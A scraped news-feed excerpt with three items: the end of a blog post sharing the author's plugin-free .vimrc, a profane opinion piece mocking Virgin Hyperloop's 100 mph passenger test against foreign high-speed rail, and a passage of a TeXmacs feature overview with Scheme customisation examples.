<p>My normal workflow utilizes mostly the UNIX shell, I am rarely keep multiple files open – except I plan to copy-paste between two files. When I have to edit a file, I enter the work directory, open the file with vim, do my edits then save, and go for the next file. Sometimes I use ‘gf’ and ctrl+O to navigate between files, I often use sed like replacements inside files, and when I have to edit multiple files I am mostly use macro recording. And that’s it, I guess. The main part of my config is about how to colorize the output, what to do with the whitespaces, things like those. I keep vim plugin free because I can easily copy my .vimrc to any server I have to work on.</p>



<p>I never really understood anybody who use IDE when there’s an UNIX shell, but that’s only me, if you are somebody who loves that software: you have my blessings. Good for you. </p>



<p>Anyway, keep it going Bram, you are awesome. </p>



<p>Here is my .vimrc in case you are curious. </p>



<figure><div>
<div id="gist106270060">
    <div>
      <div>
        <div>
  <div id="file-vimrc-vim">
    

  <div itemprop="text">
      
<table data-tab-size="8" data-paste-markdown-skip="">
      <tbody><tr>
        <td id="file-vimrc-vim-L1" data-line-number="1"></td>
        <td id="file-vimrc-vim-LC1"><span><span>"</span></span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L2" data-line-number="2"></td>
        <td id="file-vimrc-vim-LC2"><span><span>"</span>  Do not forget to create ~/.vim directory</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L3" data-line-number="3"></td>
        <td id="file-vimrc-vim-LC3"><span><span>"</span></span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L4" data-line-number="4"></td>
        <td id="file-vimrc-vim-LC4">
</td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L5" data-line-number="5"></td>
        <td id="file-vimrc-vim-LC5"><span>set</span> <span>nocompatible</span><span>                                        <span>"</span> behave VIM not VI</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L6" data-line-number="6"></td>
        <td id="file-vimrc-vim-LC6"><span>set</span> <span>number</span><span>                                              <span>"</span> Line numbering</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L7" data-line-number="7"></td>
        <td id="file-vimrc-vim-LC7"><span>autocmd</span> <span>BufWritePre</span> <span>*</span>.<span>pp</span> :<span>%</span><span>s</span><span>/\s\+$/</span>/<span>e</span><span>                   <span>"</span> White spaces                 </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L8" data-line-number="8"></td>
        <td id="file-vimrc-vim-LC8"><span>autocmd</span> <span>BufNewFile</span>,<span>BufRead</span> <span>*</span>.<span>pp</span> <span>set</span> <span>filetype</span><span>=</span><span>ruby</span><span>       <span>"</span> ruby syntax highlight for puppet </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L9" data-line-number="9"></td>
        <td id="file-vimrc-vim-LC9"><span>autocmd</span> <span>BufNewFile</span>,<span>BufRead</span> <span>*</span>.<span>cf</span> <span>set</span> <span>filetype</span><span>=</span>yaml<span>       <span>"</span> yaml syntax highlight for cloudformation</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L10" data-line-number="10"></td>
        <td id="file-vimrc-vim-LC10"><span>autocmd</span> <span>BufNewFile</span>,<span>BufRead</span> <span>*</span>.toml <span>set</span> <span>filetype</span><span>=</span>dosini<span>   <span>"</span> ini syntax highlith for rust's toml files</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L11" data-line-number="11"></td>
        <td id="file-vimrc-vim-LC11"><span>syntax</span> <span>on</span><span>                                               <span>"</span> use syntax highlight</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L12" data-line-number="12"></td>
        <td id="file-vimrc-vim-LC12"><span>filetype</span> <span>indent</span> <span>plugin</span> <span>on</span><span>                               <span>"</span> Indent files</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L13" data-line-number="13"></td>
        <td id="file-vimrc-vim-LC13"><span>set</span> <span>hidden</span><span>                                              <span>"</span> make able to switch between buffers without saving them </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L14" data-line-number="14"></td>
        <td id="file-vimrc-vim-LC14"><span>set</span> <span>showcmd</span><span>                                             <span>"</span> show current command</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L15" data-line-number="15"></td>
        <td id="file-vimrc-vim-LC15"><span>set</span> <span>showmatch</span><span>                                           <span>"</span> show matching brackets</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L16" data-line-number="16"></td>
        <td id="file-vimrc-vim-LC16"><span>set</span> <span>hlsearch</span><span>                                            <span>"</span> highlight searched words</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L17" data-line-number="17"></td>
        <td id="file-vimrc-vim-LC17"><span>set</span> <span>backspace</span><span>=</span><span>indent</span>,<span>eol</span>,<span>start</span><span>                          <span>"</span> make able to use backspace in edit mode</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L18" data-line-number="18"></td>
        <td id="file-vimrc-vim-LC18"><span>set</span> <span>autoindent</span><span>                                          <span>"</span> turn on identing </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L19" data-line-number="19"></td>
        <td id="file-vimrc-vim-LC19"><span>set</span> <span>nostartofline</span><span>                                       <span>"</span> after G not ruin the last line</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L20" data-line-number="20"></td>
        <td id="file-vimrc-vim-LC20"><span>set</span> <span>ruler</span><span>                                               <span>"</span> Which column I am in?</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L21" data-line-number="21"></td>
        <td id="file-vimrc-vim-LC21"><span>set</span> <span>laststatus</span><span>=</span><span>2</span><span>                                        <span>"</span> always display status line</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L22" data-line-number="22"></td>
        <td id="file-vimrc-vim-LC22"><span>set</span> <span>confirm</span><span>                                             <span>"</span> ask confirmation instead of failing when file is not saved</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L23" data-line-number="23"></td>
        <td id="file-vimrc-vim-LC23"><span>set</span> <span>cmdheight</span><span>=</span><span>2</span><span>                                         <span>"</span> make enough space for display messages</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L24" data-line-number="24"></td>
        <td id="file-vimrc-vim-LC24"><span>set</span> <span>tabstop</span><span>=</span><span>4</span> <span>softtabstop</span><span>=</span><span>0</span> <span>expandtab</span> <span>shiftwidth</span><span>=</span><span>4</span> <span>smarttab</span><span> <span>"</span> tab behaviour (spaces instead of tabs)</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L25" data-line-number="25"></td>
        <td id="file-vimrc-vim-LC25"><span>set</span> <span>wildmenu</span><span>                                            <span>"</span> use command line completion on opening filenames</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L26" data-line-number="26"></td>
        <td id="file-vimrc-vim-LC26"><span>set</span> <span>foldenable</span><span>                                          <span>"</span> use folds</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L27" data-line-number="27"></td>
        <td id="file-vimrc-vim-LC27"><span>set</span> <span>clipboard</span><span>=</span>unnamed<span>                                   <span>"</span> for OSX: if I copy lines to buffer, put them to the clipboard as well</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L28" data-line-number="28"></td>
        <td id="file-vimrc-vim-LC28"><span>set</span> <span>cul</span><span>                                                 <span>"</span> highligh cursor's line</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L29" data-line-number="29"></td>
        <td id="file-vimrc-vim-LC29"><span>colorscheme</span> peachpuff<span>                                   <span>"</span> colorscheme</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L30" data-line-number="30"></td>
        <td id="file-vimrc-vim-LC30"><span>set</span> <span>background</span><span>=</span>dark<span>                                     <span>"</span> I prefer dark terminal backgrounds</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L31" data-line-number="31"></td>
        <td id="file-vimrc-vim-LC31"><span>hi</span> <span>CursorLine</span>   cterm<span>=</span><span>NONE</span> ctermbg<span>=</span><span>darkblue</span> ctermfg<span>=</span><span>white</span> guibg<span>=</span><span>darkred</span> guifg<span>=</span><span>white</span><span>  <span>"</span> cursor line color</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L32" data-line-number="32"></td>
        <td id="file-vimrc-vim-LC32"><span>hi</span> <span>CursorColumn</span> cterm<span>=</span><span>NONE</span> ctermbg<span>=</span><span>darkblue</span> ctermfg<span>=</span><span>white</span> guibg<span>=</span><span>darkblue</span> guifg<span>=</span><span>white</span><span> <span>"</span> if cursors column is highlighted use these colors </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L33" data-line-number="33"></td>
        <td id="file-vimrc-vim-LC33"><span>set</span> <span>listchars</span><span>=</span><span>eol</span>:¬,<span>tab</span>:&gt;·,trai<span><span>l:</span></span>~,extend<span><span>s:</span></span>&gt;,precede<span><span>s:</span></span>&lt;,space:␣<span> <span>"</span> use these symbols for whitespaces (works in my iterm)</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L34" data-line-number="34"></td>
        <td id="file-vimrc-vim-LC34"><span>nnoremap</span> <span>&lt;Leader&gt;</span><span>c</span> :<span>set</span> <span>cursorline</span><span>!</span> <span>cursorcolumn</span><span>!</span><span>&lt;CR&gt;</span>.<span>  <span>"</span> turn on cursor line </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L35" data-line-number="35"></td>
        <td id="file-vimrc-vim-LC35">
</td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L36" data-line-number="36"></td>
        <td id="file-vimrc-vim-LC36">
</td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L37" data-line-number="37"></td>
        <td id="file-vimrc-vim-LC37"><span>autocmd</span> <span>BufWinLeave</span> <span>*</span>.<span>*</span> <span>mkview</span><span>                           <span>"</span> When exiting a file remember the opened line </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L38" data-line-number="38"></td>
        <td id="file-vimrc-vim-LC38"><span>autocmd</span> <span>BufWinEnter</span> <span>*</span>.<span>*</span> <span>loadview</span><span>                         <span>"</span> When opening a file, move cursor to the previously opened position</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L39" data-line-number="39"></td>
        <td id="file-vimrc-vim-LC39"><span>augroup</span> <span>BgHighlight</span><span>                                      <span>"</span> When multiple buffers are open, show the cursor line only in the active window</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L40" data-line-number="40"></td>
        <td id="file-vimrc-vim-LC40">    <span>autocmd</span><span>!</span>                                               </td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L41" data-line-number="41"></td>
        <td id="file-vimrc-vim-LC41">    <span>autocmd</span> <span>WinEnter</span> <span>*</span> <span>set</span> <span>cul</span>                             </td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L42" data-line-number="42"></td>
        <td id="file-vimrc-vim-LC42">    <span>autocmd</span> <span>WinLeave</span> <span>*</span> <span>set</span> <span>nocul</span>                          </td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L43" data-line-number="43"></td>
        <td id="file-vimrc-vim-LC43"><span>augroup</span> <span>END</span>                                              </td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>

</div></figure>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-361 -->

		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->

	</div><!-- #content -->

	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://blog.balazspocze.me/2020/11/04/happy-birthday-vim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072323</guid>
            <pubDate>Thu, 12 Nov 2020 17:39:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virgin Hyperloop Has Invented the World’s Crappiest High-Speed Rail]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25072110">thread link</a>) | @iron0013
<br/>
November 12, 2020 | https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/ | <a href="https://web.archive.org/web/*/https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>




</div></div></div></div></div>]]>
            </description>
            <link>https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072110</guid>
            <pubDate>Thu, 12 Nov 2020 17:24:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An overview of TeXmacs from altitude]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071915">thread link</a>) | @mgubi
<br/>
November 12, 2020 | https://texmacs.github.io/notes/docs/overview.html | <a href="https://web.archive.org/web/*/https://texmacs.github.io/notes/docs/overview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    
    
    <p>
      A rapid overview/executive summary of the TeXmacs system.
    </p>
    <h2 id="auto-2">Main features<span></span></h2>
    <ul>
      <li>
        <p>
          Visual <b>structured</b> editor: WYSWYG <b>&amp;</b> WYSWYM
        </p>
      </li>
      <li>
        <p>
          Inspired by TeX and <class>Emacs</class>
        </p>
      </li>
      <li>
        <p>
          High-quality typesetting algorithms (including microtypography)
        </p>
      </li>
      <li>
        <p>
          Special features for mathematical typesetting and input
        </p>
      </li>
      <li>
        <p>
          Support for interactive sessions: Scheme, Python, R, Octave, Maxima,
          Axiom, Mathemagix (and other CAS).
        </p>
      </li>
      <li>
        <p>
          Multi-platform: Unix, MacOS, Windows (via <class>Qt</class>)
        </p>
      </li>
      <li>
        <p>
          Own format (<class>XML</class> like). Native output to <class>PDF</class> and <class>PS</class>. Export to LaTeX,
          <class>HTML</class>
        </p>
      </li>
      <li>
        <p>
          Internal image editor, interfaces to <class>Svn</class> and
          <class>Git</class>, versioning tool, database tool,
          encryption of documents.
        </p>
      </li>
      <li>
        <p>
          Website and documentation written in TeXmacs
        </p>
      </li>
    </ul>
    <h2 id="auto-3">Gallery<span></span></h2>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-1.png" width="500">
      </p>
      <p>
        The legacy X11 backend
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-ffnlogn.png" width="600">
      </p>
      <p>
        The <class>Qt</class> backend, high quality typesetting
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2013.15.10.png" width="600">
      </p>
      <p>
        Structured editing, high quality math typesetting
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-beamer.png" width="600">
      </p>
      <p>
        Presentation mode
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2012.48.10.png" width="500">
      </p>
      <p>
        Graphics editor
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2013.08.48.png" width="650">
      </p>
      <p>
        Microtypography, synthetic math fonts
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2013.16.53.png" width="600">
      </p>
      <p>
        Interfaces to external packages (here DraTeX)
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-cas.png" width="600">
      </p>
      <p>
        Interfaces to external packages (here <class>Mathemagix</class>
        and <class>Maxima</class>)
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-chinese.png" width="600">
      </p>
      <p>
        Support for oriental scripts
      </p>
    </center>
    
    <h2 id="auto-4">Development<span></span></h2>
    <ul>
      <li>
        <p>
          Started in 1998 by <class>Joris Van Der Hoeven</class>
        </p>
        <span><ul>
          <li>
            <p>
              v0.2.3β released 26 Oct 1999
            </p>
          </li>
          <li>
            <p>
              v1.0 (2002)
            </p>
          </li>
          <li>
            <p>
              <class>Qt</class> backend in v1.0.7 (2008)
            </p>
          </li>
          <li>
            <p>
              native <class>Pdf</class> support in v1.99.1 (2013)
            </p>
          </li>
          <li>
            <p>
              currently version 1.99.9 (soon 2.1)
            </p>
          </li>
        </ul></span>
      </li>
      <li>
        <p>
          Written in <class>C++</class> (~300.000 loc) and <class>Scheme</class> (~150.000 loc) (from <a href="https://www.openhub.net/p/texmacs/analyses/latest/languages_summary">[openhub]</a>).
        </p>
      </li>
      <li>
        <p>
          Fully modular, external dependencies (mostly) isolated via tight
          interfaces.
        </p>
      </li>
      <li>
        <p>
          Two UI backends: legacy <class>X11</class> with custom widget
          library, modern <class>Qt</class> backend (cross-platform
          support).
        </p>
      </li>
      <li>
        <p>
          <b>GNU Guile as extension language</b>. C++ export basic
          manipulation routines and few internal datatypes.
        </p>
      </li>
    </ul>
    <h2 id="auto-5">TeXmacs' content model<span></span></h2>
    <p>
      All TeXmacs documents or document fragments can be thought of as
      <em>trees</em>. 
    </p>
    
    <p>
      For instance, the tree
    </p>
    <center>
      <img src="https://texmacs.github.io/notes/docs/overview-1.png">
    </center>
    <p>
      typically represents the formula
    </p>
    <center>
      <img src="https://texmacs.github.io/notes/docs/overview-2.png" id="tm-tree-ex">
    </center>
    <h2 id="auto-6">External representations<span></span></h2>
    <p>
      Serialization of TeXmacs documents without loss of informations
    </p>
    
    <ul>
      <li>
        <p>
          TeXmacs format
        </p>
        <div>
          <p>
            <tt>&lt;with|mode|math|x+y+&lt;frac|1|2&gt;+&lt;sqrt|y+z&gt;&gt;</tt>
          </p>
        </div>
      </li>
      <li>
        <p>
          <class>XML</class> format
        </p>
        <div>
          <div>
            <pre xml:space="preserve">&lt;frac&gt;&lt;tm-arg&gt;1&lt;/tm-arg&gt;&lt;tm-arg&gt;2&lt;/tm-arg&gt;&lt;/frac&gt;+&lt;sqrt&gt;y+z&lt;/sqrt&gt;</pre>
          </div>
        </div>
      </li>
      <li>
        <p>
          <class>Scheme</class> format
        </p>
        <div>
          <pre xml:space="preserve">(with "mode" "math" (concat "x+y+" (frac "1" "2") "+" (sqrt "y+z")))</pre>
        </div>
      </li>
    </ul>
    <h2 id="auto-7">Typesetting<span></span></h2>
    <p>
      Typesetting process converts TeXmacs trees into boxes:
    </p>
    <p>
      <img src="https://texmacs.github.io/notes/docs/overview-3.png">
    </p>
    <p>
      The <a href="https://texmacs.github.io/notes/regular/regular.en.html">typesetting primitives</a> are designed to be very fast and
      they are built-in into the editor:
    </p>
    <div>
      <p>
          <span>e.g. typesetting primitives for horizontal
          concatenations (<span>concat</span>), page breaks (<span>page-break</span>), mathematical fractions (<span>frac</span>),
          hyperlinks (<span>hlink</span>), and so on.</span>
        </p>
    </div>
    <p>
      The rendering of many of the primitives may be customized through the <a href="https://texmacs.github.io/notes/environment/environment.en.html">built-in environment variables</a>.
    </p>
    <div>
      <p>
          <span>e.g. the environment variable <span color="#008000"><i>color</i></span>
          specifies the current color of objects, <span color="#008000"><i>par-left</i></span>
          the current left margin of paragraphs, <abbr>etc.</abbr></span>
        </p>
    </div>
    <p>
      The <a href="https://texmacs.github.io/notes/stylesheet/stylesheet.en.html">stylesheet language</a> allows the user to write new
      primitives (macros) on top of the built-in primitives. 
    </p>
    <div>
      <p>
          <span>Contains primitives for defining macros, conditional
          statements, computations, delayed execution, <abbr>etc.</abbr> and a
          special <span>extern</span> tag to inject <class>Scheme</class>
          expressions in order to write macros.</span>
        </p>
    </div>
    <h2 id="auto-8">Macros<span></span></h2>
    <p>
      Evaluation of TeXmacs trees proceeds by reduction of the primitives,
      essentialy by evaluation of macro applications.
    </p>
    
    <p>
        <span color="blue">&lt;</span>assign<span color="blue">|</span><span color="#008000"><i>hello</i></span><span color="blue">|</span><span color="black"><span color="blue">&lt;</span>macro<span color="blue">|</span><span color="brown"><i>name</i></span><span color="blue">|</span><span color="black"><span color="black">Hello </span><span color="black"><span color="brown"><i>name</i></span></span><span color="black">, how are you today?</span></span><span color="blue">&gt;</span></span><span color="blue">&gt;</span>
      </p>
    
    <p>
      Macros have editable input fields. Examples here below (activate the
      macros):
    </p>
    <p>
      <span color="blue">&lt;</span>assign<span color="blue">|</span><span color="#008000"><i>hello</i></span><span color="blue">|</span><span color="black"></span><span color="blue">&gt;</span>
    </p>
    
    <p>
      <span color="blue">&lt;</span>assign<span color="blue">|</span><span color="#008000"><i>seq</i></span><span color="blue">|</span><span color="black"></span><span color="blue">&gt;</span>
    </p>
    <center>
      <img src="https://texmacs.github.io/notes/docs/overview-4.png">
    </center>
    <h2 id="auto-9"><class>Guile</class> as extension language<span></span></h2>
    <p>
      TeXmacs is extendable and customizable in various ways:
    </p>
    <ul>
      <li>
        <p>
          <class><b>Guile</b></class> embedded as extension and
          scripting language
        </p>
      </li>
      <li>
        <p>
          A plugin system allows asyncronous communication with external
          programs 
        </p>
      </li>
      <li>
        <p>
          Mechanism to dynamically load external code (via C interface)
        </p>
      </li>
    </ul>
    
    <p>
      <class>Guile</class> is easy to embed and provides a reasonably
      fast implementation of <class>Scheme</class>.
    </p>
    
    <p>
      Why <class>Scheme</class>?
    </p>
    <ol>
      <li>
        <p>
          Allows to mix programs and data in a common framework.
        </p>
      </li>
      <li>
        <p>
          Allows to customize the language itself, by adding new programming
          constructs.
        </p>
      </li>
      <li>
        <p>
          Allows to write programs on a very abstract level.
        </p>
      </li>
    </ol>
    <h2 id="auto-10"> Menus<span></span></h2>
    <div>
      <pre xml:space="preserve">(menu-bind file-menu
  ("New" (new-buffer))
  ("Load" (choose-file load-buffer "Load file" ""))
  ("Save" (save-buffer))
  …)</pre>
    </div>
    <p>
      can be easily extended from user code:
    </p>
    <div>
      <pre xml:space="preserve">(menu-bind insert-menu
  (former)
  –––
  (-&gt; "Opening"
      ("Dear Sir" (insert "Dear Sir,"))
      ("Dear Madam" (insert "Dear Madam,")))
  (-&gt; "Closing"
      ("Yours sincerely" (insert "Yours sincerely,"))
      ("Greetings" (insert "Greetings,"))))</pre>
    </div>
    <h2 id="auto-11">Some more GUI<span></span></h2>
    <p>
      Keybindings
    </p>
    <div>
      <pre xml:space="preserve">(kbd-map
  ("D e f ." (make 'definition))
  ("L e m ." (make 'lemma))
  ("P r o p ." (make 'proposition))
  ("T h ." (make 'theorem)))</pre>
    </div>
    <p>
      The file <tt>my-init-buffer.scm</tt> is executed every time a
      buffer is loaded, it allows some specific customizations. For example:
    </p>
    <div>
      <pre xml:space="preserve">(if (not (buffer-has-name? (current-buffer)))
    (begin
      (init-style "article")
      (buffer-pretend-saved (current-buffer))))

(if (not (buffer-has-name? (current-buffer)))
    (make-session "maxima" (url-&gt;string (current-buffer))))</pre>
    </div>
    <h2 id="auto-12">Scheme invocation<span></span></h2>
    <p>
      <class>Scheme</class> commands can be invoked interactively (like
      in <class>Emacs</class>) using the <span>⌘⌃X</span>
      shortcut. 
    </p>
    <p>
      A <class>Scheme</class> session is started using the →→<a id="auto-13"></a> menu item:
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><span color="#008000"><pre xml:space="preserve">scheme] </pre></span></td>
          <td><span color="black"><pre xml:space="preserve">(define (square x) (* x x))</pre></span></td>
        </tr></tbody>
      </table>
    </div>
    
    <div>
      <table>
        <tbody><tr>
          <td><span color="#008000"><pre xml:space="preserve">scheme] </pre></span></td>
          <td><span color="black"><pre xml:space="preserve">(kbd-map ("h i ." (insert "Hi there!")))</pre></span></td>
        </tr></tbody>
      </table>
    </div>
    <div>
      <table>
        <tbody><tr>
          <td><span color="#008000"><pre xml:space="preserve">scheme] </pre></span></td>
          <td><span color="black"><pre xml:space="preserve">;; try typing ‘‘hi.''</pre></span></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      <class>Scheme</class> commands can be invoked from the command
      line:
    </p>
    <div>
